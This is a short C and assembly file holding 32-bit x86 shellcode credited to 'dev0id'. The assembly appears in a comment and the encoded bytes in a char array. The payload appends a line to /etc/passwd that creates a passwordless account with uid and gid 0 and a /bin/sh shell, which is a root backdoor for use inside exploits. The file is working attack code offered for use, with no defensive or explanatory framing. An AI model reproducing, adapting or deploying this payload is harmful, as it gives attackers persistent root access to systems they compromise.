/*************************************************************
This shellcode writes to /etc/passwd the string for the user
with uid&gid == 0;
	written by dev0id dev0id@mail.ru (rootteam.void.ru)
	  		  #rus-sec /Efnet.org
greetz:
	nerf
	w00w00
*************************************************************

BITS 32
jmp short path
main:
	pop	esi
	xor	eax,eax
	push	eax
	mov byte [esi+11],al
	mov	al,0x0a
	push	eax
	push	esi
	mov	al,5
	push	eax
	int	0x80


	mov	edx,eax

	push long 0x0a206873
	push long 0x2f6e6962
	push long 0x2f3a2f3a
	push long 0x313a303a
	push long 0x303a3a31
	mov ebx,esp
	mov	al,20
	push	eax
	push	ebx
	push	edx
	mov	al,4
	push	eax
	int	0x80

	mov	al,1
	push	eax
	int	0x80
path:
	call main
	db	"/etc/passwd#"

********************************************************************/
char shellcode[] =
	"\xeb\x3c\x5e\x31\xc0\x50\x88\x46\x0b\xb0\x0a\x50\x56\xb0\x05"
	"\x50\xcd\x80\x89\xc2\x68\x73\x68\x20\x0a\x68\x62\x69\x6e\x2f"
	"\x68\x3a\x2f\x3a\x2f\x68\x3a\x30\x3a\x31\x68\x31\x3a\x3a\x30"
	"\x89\xe3\xb0\x14\x50\x53\x52\xb0\x04\x50\xcd\x80\xb0\x01\x50"
	"\xcd\x80\xe8\xbf\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73"
	"\x73\x77\x64\x23";